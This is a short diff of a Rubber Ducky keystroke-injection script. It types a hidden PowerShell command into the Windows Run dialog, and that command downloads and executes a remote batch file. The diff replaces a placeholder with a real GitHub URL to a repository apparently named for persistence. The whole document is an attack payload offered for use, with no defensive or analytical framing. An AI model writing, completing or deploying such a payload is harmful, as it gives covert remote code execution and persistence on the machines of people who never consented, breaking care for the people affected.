@@ -15,5 +15,5 @@ ALT y
 DELAY 1000
 GUI r
 DELAY 100
-STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('URL TO BAT HERE'); && exit"
+STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/shvbyte/persistentRducky/main/prshell.bat'); && exit"
 ENTER
